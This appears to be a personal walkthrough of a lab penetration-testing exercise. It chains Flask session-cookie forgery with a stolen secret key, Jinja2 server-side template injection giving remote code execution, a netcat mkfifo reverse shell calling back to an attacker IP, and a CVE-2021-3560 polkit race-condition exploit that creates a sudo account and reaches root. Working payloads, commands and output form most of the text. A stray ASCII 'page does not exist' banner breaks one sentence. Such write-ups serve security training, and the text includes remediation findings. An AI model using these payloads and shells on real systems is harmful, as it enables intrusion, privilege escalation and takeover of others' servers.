If we are doing two things at once (starting the app, then sending a request to it), we will need to use threading, thus our next lines of code are:
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

This creates a thread and gives it the job of starting waitress using our app object on localhost:9000. It then tells the thread to daemonise, meaning it won't prevent the program from exiting (i.e. if the program exits then the server will also stop, but the program won't wait for the server to stop before exiting). Finally we start the thread, making the server run in the background.

The last thing we need this program to do is query the server:
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))

This will wait for one second to give waitress enough time to start the server, then it will query the endpoint that we setup, making Flask generate and provide us with a cookie which the program will then print out. The program then ends, stopping the server automatically.

We are now ready to go!

The final program should look like this, albeit with your own key substituted in:
        

**poc.py**

           
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

#Flask Initialisation
app = Flask(__name__)
app.config["SECRET_KEY"] = "
"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "Pentester"
    return "Check your cookies", 200

#Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

#Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))

Running the program should give us a cookie signed by the server using our stolen key:
Demonstration of the PoC code

This will be different every time the program is run.

Now let's finish this. Copy the generated cookie, open your browser dev tools on the website, and overwrite the value of your current session cookie. This can also be done using a browser extension such as Cookie-Editor.

┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ python3 poc.py    
/home/kali/Downloads/BinaryHeaven/poc.py:19: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
  thread.setDaemon(True)
eyJhdXRoIjoiVHJ1ZSIsInVzZXJuYW1lIjoiUGVudGVzdGVyIn0.Yuxpmg.tQk-QZg5URo0BusUkZ3IR9x0e6s

**change the cookie (eyJhdXRoIjoiVHJ1ZSIsInVzZXJuYW1lIjoiUGVudGVzdGVyIn0.Yuxpmg.tQk-QZg5URo0BusUkZ3IR9x0e6s) -> admin for me in inspect/storage/cookies**
Admin Console Welcome, Pentester

There have been 25698 unique visitors to the site!

**server side template injection (SSTI)**

We have gained access to the admin console, but we don't appear to have gained anything by doing so. All we have here is a stats counter (which we already had from downloading the DB anyway).

So, why did we bother going through all that rigamarole if the admin console doesn't actually give us any extra power over the webapp?

If you've hacked Flask apps before, you may already know the answer to this having read through the source code for the application. There is a serious vulnerability in the admin.py module -- one that (in this case) can only be accessed after we login.

When you logged into the admin page, did you notice that it echoed the forged username back to you?
Image highlighting the username getting echoed back on the admin page

This indicates that there is some form of template editing going on in the background -- in other words, the webapp is taking a prewritten template and injecting values into it. There are secure ways to do this, and there are... less secure ways of doing it.

Specifically, the code involved (from modules/admin.py) is this:
modules/admin.py

@abp.route("/")
@authCheck
def manageHome():
    conn = StatsConn()
    uniqueViews = conn.getViews()
    response = f"""
<!DOCTYPE html>
<html lang=en>
    <head>
        <title>Admin Section</title>

---

                            <span class="section-heading-upper">Admin Console</span>
                            <span class="section-heading-lower">Welcome, {session['username']}</span>
                        </h2>
                        <p class="mb-3">There have been {uniqueViews} unique visitors to the site!</p>
                    </div>

---

        </footer>
    </body>
</html>
    """
    return render_template_string(response), 200


           
        

Aside from using an inline string for the template (which is both messy and revoltingly bad practice), this also injects the contents of session["username"] directly into the template prior to rendering it. It does the same thing with uniqueViews (the number of unique visitors to the site); however, we can't modify this. What we can do is change our username to something that the Flask templating engine


        \          SORRY            /
         \                         /
          \    This page does     /
           ]   not exist yet.    [    ,'|
           ]                     [   /  |
           ]___               ___[ ,'   |
           ]  ]\             /[  [ |:   |
           ]  ] \           / [  [ |:   |
           ]  ]  ]         [  [  [ |:   |
           ]  ]  ]__     __[  [  [ |:   |
           ]  ]  ] ]\ _ /[ [  [  [ |:   |
           ]  ]  ] ] (#) [ [  [  [ :===='
           ]  ]  ]_].nHn.[_[  [  [
           ]  ]  ]  HHHHH. [  [  [
           ]  ] /   `HH("N  \ [  [
           ]__]/     HHH  "  \[__[
           ]         NNN         [
           ]         N/"         [
           ]         N H         [
          /          N            \
         /           q,            \
        /                           \

 will evaluate as code. This vulnerability is referred to as an SSTI -- Server Side Template Injection; it can easily result in remote code execution on the target.

There is already an entire room covering SSTI in Flask applications, so we will not go into a whole lot of detail about the background of the vulnerability here. The short version is this:

Flask uses the Jinja2 templating engine. A templating engine is used to "render" static templates -- in other words, it works with the webapp to substitute in variables and execute pieces of code directly with the template. For example, take a look at the following HTML:
Example Jinja2 Template

           
<!DOCTYPE html>
<html lang=en>
   <head>
       <title>{{title}}</title>
   </head>
   <body>
       <h1>Learn Templating!</h1>
   </body>
</html>

        

Notice anything unusual? This HTML code has a {{title}} in it. This {{ }} structure (and a few other similar structures) is what tells Jinja2 that it needs to do something with this template -- specifically, in this case it would be filling in a variable called title. This could then be called at the end of a Flask route by Python code looking something like this:
return render_template("test.html", title="Templates!"), 200

The Templates! would then be substituted in as the title of the page when it loads in a client's browser.

This is all well and good, but what happens if we control the template? What if we could add things directly into the template before it gets rendered? We could inject code blocks inside curly brackets and Jinja2 would execute them when it rendered the template.

Here is an example:
render_template_string Example

           
title = "Templates!"
response = f"""
<!DOCTYPE html>
<html lang=en>
   <head>
       <title>{title}</title>
   </head>
   <body>
       <h1>Learn Templating!</h1>
   </body>
</html>"""
return render_template_string(response), 200

        

Instead of using render_template, this code uses the render_template_string function to render a template stored as an inline Python string. Instead of passing in the title variable to Jinja2 for rendering, a Python f-string is used to format the template before it is rendered. In other words, the developer has substituted in the contents of title before the string is actually passed to the templating engine.

This is fine for the example above (if poor practice), but what happens if title was, say: {{7*6}}?
{{7*6}}

           
title = "{{7*6}}"
response = f"""
<!DOCTYPE html>
<html lang=en>
   <head>
       <title>{title}</title>
   </head>
   <body>
       <h1>Learn Templating!</h1>
   </body>
</html>"""
return render_template_string(response), 200

        

Notice how similar this is to the code we saw in the admin.py module?

This is the template that the templating engine would receive:s


Injected Template

           
<!DOCTYPE html>
<html lang=en>
   <head>
       <title>{{7*6}}</title>
   </head>
   <body>
       <h1>Learn Templating!</h1>
   </body>
</html>

        

Meaning Jinja2 would evaluate 7*6 and display this to the client:
Evaluated Template -- SSTI!

           
<!DOCTYPE html>
<html lang=en>
   <head>
       <title>42</title>
   </head>
   <body>
       <h1>Learn Templating!</h1>
   </body>
</html>

        

Getting the templating engine to do simple calculations for us is not desperately useful, but it's a really good way of demonstrating that an SSTI vulnerability exists.

This can only occur if the developer is handling the templates exceptionally stupidly (which, for this webapp, they are).

Regardless, this is is still one of the most stereotypical vulnerabilities to find in a Flask application -- for a reason. A better option would be to pass the variables needing rendered into Jinja2, rather than editing the template directly.

Okay, let's go confirm the presence of an SSTI vulnerability.

We can use the same Proof of Concept script that we wrote to forge our admin cookie, but this time we set the username to "{{7*6}}":

┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ nano update_poc.py
                                                                          
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ python3 update_poc.py 
/home/kali/Downloads/BinaryHeaven/update_poc.py:18: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
  thread.setDaemon(True)
eyJhdXRoIjoiVHJ1ZSIsInVzZXJuYW1lIjoie3s3KjZ9fSJ9.Yuxwog.SvnZ5_gtb_NL5xEZyRgXDlrga5k



Admin Console Welcome, 42

There have been 25699 unique visitors to the site!

Okay, we've demonstrated SSTI. How do we weaponize it?

As always, PayloadsAllTheThings is our friend -- specifically the Jinja section of the SSTI page.

There are various RCE payloads available here. Through trial and error, we find one which works:
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

If we put this into our PoC code in the username field then execute the script and overwrite our cookie once again, we can confirm that this works:
Payload Snippet

           
---
@app.route("/")
def main():
    session["auth"] = "True"
    #session["username"] = "{{7*6}}"
    session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"""
    return "Check your cookies", 200
---

──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ nano sh_poc.py
                                                                          
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ python3 sh_poc.py
/home/kali/Downloads/BinaryHeaven/sh_poc.py:19: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
  thread.setDaemon(True)
.eJwdyEEKgCAQAMC_7EWF8AG9o1uEbLaZYCqunsS_J92G6YCtPrDCVhrBAo2pRHxpTu82xds7bYwNyGzMlI--_nAhnRhm7iKxOHROmaIUgYXShfCSagwYH0KTIT4.YuxxjA.RmflMnUvv6_5WJSsVbHOSLGWgqg

Admin Console Welcome, assets css data js libs main.py modules requirements.txt theme views

There have been 25700 unique visitors to the site!
      

Almost time to weaponize this, but first we need to do a little enumeration. Specifically, we need to know if there is a firewall in place, what software is installed, and preferably if there are any protective measures in place. This is Linux so the chances of having to deal with anti-virus is minimal, but we may need to circumvent hardening measures (e.g. AppArmour, SeLinux, etc).

Running multiple commands in this situation is a pain as we would need to generate a new cookie for each command. Instead we will just use one big one-liner to enumerate as many things at once as possible:

session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('echo ""; id; whoami; echo ""; which nc bash curl wget; echo ""; sestatus 2>&1; aa-status 2>&1; echo ""; cat /etc/*-release; echo""; cat /etc/iptables/*').read()}}"""

 Admin Console Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data /usr/bin/nc /usr/bin/bash /usr/bin/curl /usr/bin/wget /bin/sh: 1: sestatus: not found You do not have enough privilege to read the profile set. apparmor module is loaded. DISTRIB_ID=Ubuntu DISTRIB_RELEASE=20.04 DISTRIB_CODENAME=focal DISTRIB_DESCRIPTION="Ubuntu 20.04.2 LTS" NAME="Ubuntu" VERSION="20.04.2 LTS (Focal Fossa)" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu 20.04.2 LTS" VERSION_ID="20.04" HOME_URL="https://www.ubuntu.com/" SUPPORT_URL="https://help.ubuntu.com/" BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/" PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy" VERSION_CODENAME=focal UBUNTU_CODENAME=focal # Generated by iptables-save v1.8.4 on Tue Jun 22 22:27:55 2021 *filter :INPUT ACCEPT [174:25634] :FORWARD ACCEPT [0:0] :OUTPUT DROP [0:0] -A INPUT -p icmp -j DROP -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A OUTPUT -o lo -j ACCEPT -A OUTPUT -p tcp -m multiport --dports 443,445,80,25,53 -j ACCEPT -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT -A OUTPUT -p icmp -j ACCEPT COMMIT # Completed on Tue Jun 22 22:27:55 2021 # Generated by ip6tables-save v1.8.4 on Tue Jun 22 22:27:55 2021 *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] COMMIT # Completed on Tue Jun 22 22:27:55 2021 
 
This gets us user information, useful software, lockdown status, release information and firewall information: enough to be getting on with.

The output of this is extremely difficult to read in the tiny little information box of the admin page, so it's worth looking at the source code for an easy-to-read output instead:
Enumeration Output

uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data

/usr/bin/nc
/usr/bin/bash
/usr/bin/curl
/usr/bin/wget

/bin/sh: 1: sestatus: not found
You do not have enough privilege to read the profile set.
apparmor module is loaded.

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION=&#34;Ubuntu 20.04.2 LTS&#34;
NAME=&#34;Ubuntu&#34;
VERSION=&#34;20.04.2 LTS (Focal Fossa)&#34;
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME=&#34;Ubuntu 20.04.2 LTS&#34;
VERSION_ID=&#34;20.04&#34;
HOME_URL=&#34;https://www.ubuntu.com/&#34;
SUPPORT_URL=&#34;https://help.ubuntu.com/&#34;
BUG_REPORT_URL=&#34;https://bugs.launchpad.net/ubuntu/&#34;
PRIVACY_POLICY_URL=&#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&#34;
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

# Generated by iptables-save v1.8.4 on Tue Jun 22 22:27:55 2021
*filter
:INPUT ACCEPT [174:25634]
:FORWARD ACCEPT [0:0]
:OUTPUT DROP [0:0]
-A INPUT -p icmp -j DROP
-A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -p tcp -m multiport --dports 443,445,80,25,53 -j ACCEPT
-A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
-A OUTPUT -p icmp -j ACCEPT
COMMIT
# Completed on Tue Jun 22 22:27:55 2021
# Generated by ip6tables-save v1.8.4 on Tue Jun 22 22:27:55 2021
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
COMMIT
# Completed on Tue Jun 22 22:27:55 2021


           
        

This tells us a bunch of useful things:

    As expected we are in the low-privileged www-data account
    We have enough useful software to easily make web requests and create a reverse shell
    SeLinux is not installed. AppArmour is, and we don't have permission to view the status, so we'll have to go in blind and hope
    This is an Ubuntu 20.04 machine -- as expected
    There is a firewall in place (as expected). It blocks all outgoing traffic to anything other than TCP ports 443, 445, 80, 25, or 53, and UDP port 53. Outbound ICMP packets are allowed. There are no IPv6 rules.

We've done all we can for now. Let's get a shell and be done with this. A standard netcat mkfifo shell ought to do the trick:
session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.18.1.77 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}"""

Vulnerabilities:
ID
	Rank
	CVSS
	Vulnerability
	Remediation
HF-WEB-6
	Critical	9.1
	

Admin console is vulnerable to a Server Side Template Injection vulnerability leading to remote code execution. When chained with HF-WEB-3, this effectively allows unauthenticated RCE as the www-data user.
	

Change the source code for the webapp so that it no longer dynamically alters the template prior to rendering by the Jinja2 template engine. Instead pass the variables directly into Jinja2 for rendering.
Answer the questions below

Substitute your own TryHackMe IP address into the command above and start a netcat listener on port 443 (sudo netcat -lvnp 443).

Overwrite your cookie one last time and get a shell!

**RCE completed**
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ sudo nc -lvnp 443       
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.18.1.77] from (UNKNOWN) [10.10.149.10] 39346
whoami
www-data

**Shell Stabilisation and Local Enumeration **

Before we do anything else, let's quickly stabilise our reverse shell. As www-data we won't be able to use SSH, so that's out. We could upload socat and use that, but we don't know what AppArmour is doing just now (although checking that with our new access should be high on our list of priorities!). Let's instead just use the classic "Python" shell stabilisation technique. This is explained in detail in the Intro to Shells room, which you are recommended to have a look through if you haven't already.

First let's check that we can use Python:
which python python3

which python python3
/usr/bin/python3

The affirmative response indicates that this technique is good to go, so we will start by creating a PTY running bash:
python3 -c 'import pty;pty.spawn("/bin/bash")'

Next we set the TERM environment variable. This gives us access to commands such as clear.
export TERM=xterm

Finally we remove the terminal echo of our own shell (so that we can use Ctrl + C / Ctrl + Z without killing our shell), and set the tty size of our remote shell to match that of our terminal so that we can use full-screen programs such as text-editors.

    Press Ctrl + Z (or equivalent for your keyboard) to background the remote shell.
    Run stty -a in your own terminal and note down the values for rows and columns.
    Run stty raw -echo; fg in your own terminal to disable terminal echo and bring the remote shell back to the foreground.
    Use stty rows NUMBER cols NUMBER in the remote shell to set the tty size
    Note: these numbers depend on your screen and terminal size and will likely be different for everyone
    
***
python -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh: 3: python: not found
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@websrv1:/opt/site$ export TERM=xterm
export TERM=xterm
www-data@websrv1:/opt/site$ ^Z 
zsh: suspended  sudo nc -lvnp 443
                                                                          
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ stty -a | head -1
speed 38400 baud; rows 20; columns 74; line = 0;
                                                                          
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ stty raw -echo;fg
[1]  + continued  sudo nc -lvnp 443
                                   stty rows 20 cols 74
stty rows 20 cols 74
www-data@websrv1:/opt/site$ 
***
Let's quickly check the /etc/apparmor.d directory to see if there are any configurations that would restrict us from enumerating:

www-data@websrv1$ ls -la /etc/apparmor.d
total 112
drwxr-xr-x 4 root root  4096 Jun 12 21:05 abstractions
drwxr-xr-x 2 root root  4096 Jun 12 21:00 disable
drwxr-xr-x 2 root root  4096 Feb 11  2020 force-complain
drwxr-xr-x 2 root root  4096 Jun 22 18:42 local
-rw-r--r-- 1 root root  1313 May 19  2020 lsb_release
-rw-r--r-- 1 root root  1108 May 19  2020 nvidia_modprobe
-rw-r--r-- 1 root root  3222 Mar 11  2020 sbin.dhclient
drwxr-xr-x 5 root root  4096 Oct 26  2020 tunables
-rw-r--r-- 1 root root 11082 Apr  1 09:35 usr.bin.evince
-rw-r--r-- 1 root root  9007 May 31 21:32 usr.bin.firefox
-rw-r--r-- 1 root root  3202 Feb 25  2020 usr.bin.man
-rw-r--r-- 1 root root  1519 Mar 15 18:12 usr.lib.libreoffice.program.oosplash
-rw-r--r-- 1 root root  1227 Mar 15 18:12 usr.lib.libreoffice.program.senddoc
-rw-r--r-- 1 root root 10653 Mar 15 18:12 usr.lib.libreoffice.program.soffice.bin
-rw-r--r-- 1 root root  1046 Mar 15 18:12 usr.lib.libreoffice.program.xpdfimport
-rw-r--r-- 1 root root   540 Apr 10  2020 usr.sbin.cups-browsed
-rw-r--r-- 1 root root  5797 Apr 24  2020 usr.sbin.cupsd
-rw-r--r-- 1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
-rw-r--r-- 1 root root  2477 Sep 28  2020 usr.sbin.named
-rw-r--r-- 1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1385 Dec  7  2019 usr.sbin.tcpdump


        

It doesn't look like there are any custom policies or signs of anything being locked down more than the default configuration, so we should be good to go on the enumeration front. That said, the fact that FireFox, LibreOffice and cupsd are installed is very interesting -- these indicate that the machine has a desktop environment installed (presumably it has a monitor plugged in for easy configuration wherever it is in the client's office). Worth keeping in mind as we progress.

Now would be a good time to start running some enumeration scripts (e.g. LinPEAS, LinEnum, LES, LSE, Unix-Privesc-Check, etc). It's good practice to run several of these, as they all check for slightly different things and what one finds another may not.

That said, before we start uploading scripts, we would be as well performing a few manual privilege escalation checks. This is especially useful if there are serious new vulnerabilities out for the distribution that we're attacking as these may not yet be patched on the target. At the time of writing there is a brand new privilege escalation vulnerability in the Polkit authentication module which affects Ubuntu 20.04 (CVE-2021-3560), so checking for this is an absolute must. Running any of the scripts (or checking manually), we also find that there are no user accounts on the machine, and that SSH is enabled for the root user with a private key. This indicates that the root account is used for day-to-day administrative tasks.

There's no strict order for manual checking, so let's just jump straight to it and look for unpatched software:

www-data@websrv1$ apt list --upgradeable
Listing... Done
alsa-ucm-conf/focal-updates 1.2.2-1ubuntu0.8 all [upgradable from: 1.2.2-1ubuntu0.7]
bluez-obexd/focal-updates,focal-security 5.53-0ubuntu3.2 amd64 [upgradable from: 5.53-0ubuntu3.1]
bluez/focal-updates,focal-security 5.53-0ubuntu3.2 amd64 [upgradable from: 5.53-0ubuntu3.1]
firefox/focal-updates,focal-security 89.0.2+build1-0ubuntu0.20.04.1 amd64 [upgradable from: 89.0+build2-0ubuntu0.20.04.2]
gcc-10-base/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
gir1.2-secret-1/focal-updates 0.20.4-0ubuntu1 amd64 [upgradable from: 0.20.3-0ubuntu1]
initramfs-tools-bin/focal-updates 0.136ubuntu6.6 amd64 [upgradable from: 0.136ubuntu6.5]
initramfs-tools-core/focal-updates 0.136ubuntu6.6 all [upgradable from: 0.136ubuntu6.5]
initramfs-tools/focal-updates 0.136ubuntu6.6 all [upgradable from: 0.136ubuntu6.5]
libatomic1/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libcc1-0/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libgcc-s1/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libgomp1/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libhogweed5/focal-updates,focal-security 3.5.1+really3.5.1-2ubuntu0.2 amd64 [upgradable from: 3.5.1+really3.5.1-2ubuntu0.1]
libitm1/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
liblsan0/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libnettle7/focal-updates,focal-security 3.5.1+really3.5.1-2ubuntu0.2 amd64 [upgradable from: 3.5.1+really3.5.1-2ubuntu0.1]
libnss-systemd/focal-updates 245.4-4ubuntu3.7 amd64 [upgradable from: 245.4-4ubuntu3.6]
libpam-systemd/focal-updates 245.4-4ubuntu3.7 amd64 [upgradable from: 245.4-4ubuntu3.6]
libpolkit-agent-1-0/focal-updates,focal-security 0.105-26ubuntu1.1 amd64 [upgradable from: 0.105-26ubuntu1]
libpolkit-gobject-1-0/focal-updates,focal-security 0.105-26ubuntu1.1 amd64 [upgradable from: 0.105-26ubuntu1]
libprocps8/focal-updates 2:3.3.16-1ubuntu2.2 amd64 [upgradable from: 2:3.3.16-1ubuntu2.1]
libpulse-mainloop-glib0/focal-updates 1:13.99.1-1ubuntu3.11 amd64 [upgradable from: 1:13.99.1-1ubuntu3.10]
libpulse0/focal-updates 1:13.99.1-1ubuntu3.11 amd64 [upgradable from: 1:13.99.1-1ubuntu3.10]
libpulsedsp/focal-updates 1:13.99.1-1ubuntu3.11 amd64 [upgradable from: 1:13.99.1-1ubuntu3.10]
libquadmath0/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [upgradable from: 10.2.0-5ubuntu1~20.04]
libsecret-1-0/focal-updates 0.20.4-0ubuntu1 amd64 [upgradable from: 0.20.3-0ubuntu1]
libsecret-common/focal-updates 0.20.4-0ubuntu1 all [upgradable from: 0.20.3-0ubuntu1]
---


        

Quite the list! This machine is clearly in need of some upgrades, which could be very good for us and very bad for the client.

Unfortunately for the client, the polkit libraries are not updated (version 0.105-26ubuntu1 rather than 0.105-26ubuntu1.1), which means we should be able to escalate privileges straight to root using CVE-2021-3560.

Vulnerabilities:
ID
	Rank
	CVSS
	Vulnerability
	Remediation
HF-LO-1
	Low	3.4
	Root account is used for day-to-day administration of the server and is allowed SSH access with a private key.
	

Create a new user(s) with appropriate permissions to login with and perform day-to-day administration.

Remove login access with the root account and use sudo or pkexec from a lower-privileged account when root privileges are required.
Answer the questions below
Stabilise your shell and have a poke around the machine.

***privilege scalation (polkit)**
CVE-2021-3560 is, fortunately, a very easy vulnerability to exploit if the conditions are right. The vuln is effectively a race condition in the policy toolkit authentication system.

There is already a TryHackMe room which covers this vulnerability in much more depth here, so please complete that before continuing if you haven't already done so as we will not cover the "behind the scenes" of the vuln in nearly as much depth here.

Effectively, we need to send a custom dbus message to the accounts-daemon, and kill it approximately halfway through execution (after it gets received by polkit, but before polkit has a chance to verify that it's legitimate -- or, not, in this case).

We will be trying to create a new account called "attacker" with sudo privileges. Before we do so, let's check to see if an account with this name already exists:
Check to see if the account exists

           
www-data@websrv1$ id attacker
id: ‘attacker’: no such user

        

Perfect -- this username is free to use!

Now that we've established that we can create a new account with the username "attacker" without disrupting anything else on the box, let's get a benchmark for how long it takes to send and process a dbus message to the accounts daemon:
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1

This attempts to create our new account, and times how long it takes for the command to finish. In the target machine this should be about 11 milliseconds:
Timing the attack

www-data@websrv1:/opt/site$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required

real	0m0.011s
user	0m0.002s
sys     0m0.000s


           
        

We now need to take the same dbus message, send it, then cut it off at about halfway through execution. 5 milliseconds tends to work fairly well for this box:
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!

We can then check to see if a new account has been created (id attacker):
Adding the account

           
www-data@websrv1:/opt/site$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
[1] 934
www-data@websrv1:/opt/site$ 
[1]+  Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
www-data@websrv1:/opt/site$ id attacker
uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),27(sudo)

        

Note: you may need to repeat this a few times with different delays before the account is created.

Notice that this account is in the sudoers group. For a full breakdown of this command, refer to the Polkit room.

Next we need to set a password for this account. We use exactly the same technique here, but with a different dbus message. Whatever delay worked last time should also work here:
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!

This will set the password of our new account to Expl01ted -- all ready for us to just su then sudo -s our way to root!
Getting root!

           
www-data@websrv1:/opt/site$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
[1] 994
www-data@websrv1:/opt/site$ su attacker
Password: 
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

attacker@websrv1:/opt/site$ sudo -s
[sudo] password for attacker: 
root@websrv1:/opt/site# whoami
root
root@websrv1:/opt/site# id
uid=0(root) gid=0(root) groups=0(root)
root@websrv1:/opt/site# ip a
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0:  mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:e4:5b:fc:14:69 brd ff:ff:ff:ff:ff:ff
    inet 10.10.149.10/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2822sec preferred_lft 2822sec
    inet6 fe80::e4:5bff:fefc:1469/64 scope link 
       valid_lft forever preferred_lft forever

        

And with that, we are done. Although, we aren't really, because we should keep looking around for more vulnerabilities. The goal in an assessment isn't necessarily to "root the box" -- the goal is to identify vulnerabilities in the target and raise them with the client. Being able to obtain administrative privileges over the target counts as a vulnerability, and helps us to identify further vulnerabilities, but isn't the be-all-end-all.

Vulnerabilities:
ID
	Rank
	CVSS
	Vulnerability
	Remediation
HF-LO-2
	High
	7.2
	Device is vulnerable to CVE-2021-3560 in the Polkit authentication module
	

Perform a full software upgrade on the device as soon as possible (sudo apt update && sudo apt upgrade). If this is impossible then upgrade the following packages: policykit-1, libpolkit-agent-1-0 and libpolkit-gobject-1-0, to at least version: 0.105-26ubuntu1.1.


Answer the questions below
+ 150

Might as well be able to prove to the client that we've been here (aside from the many screenshots we have been taking).

What is the root user's password hash? $6$./Fh3mWMsk8X29kq$6CvaDzV7zlXKn1MMQjXtO.abB4/7ecNKBFkQvEWsLkgM8raAZeuSHZurnXG01pqZ4BY2ubk/WgIbo4ee.wnaP0

**me**

└─$ python3 final_shell.py 
/home/kali/Downloads/BinaryHeaven/final_shell.py:21: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
  thread.setDaemon(True)
.eJxNzNEKgjAYhuFb-dlBU4jNlWBkeA-BJxUx5po6cpts88i896STPHt5PvhmJKbYozOq_aTQHk1BeSuMWmWepbOt7gjnchAhcL6Wtjr-ohtcI4YVH9gF_CSjG5VNsHm3unVAoxnpvb5mtxKsBJYRdiKMFAXk-RGyy3-HD9BGWxp6qDZ6qHasBG82TzglXolXki4LWr4LWjoq.Yux0Sg.o7LeUVF4q4bR7wx_wIjytqBjPt8
                                                                          
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ sudo nc -lvnp 443       
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.18.1.77] from (UNKNOWN) [10.10.149.10] 39346
whoami
www-data
which python python3
/usr/bin/python3
python -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh: 3: python: not found
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@websrv1:/opt/site$ export TERM=xterm
export TERM=xterm
www-data@websrv1:/opt/site$ ^Z 
zsh: suspended  sudo nc -lvnp 443
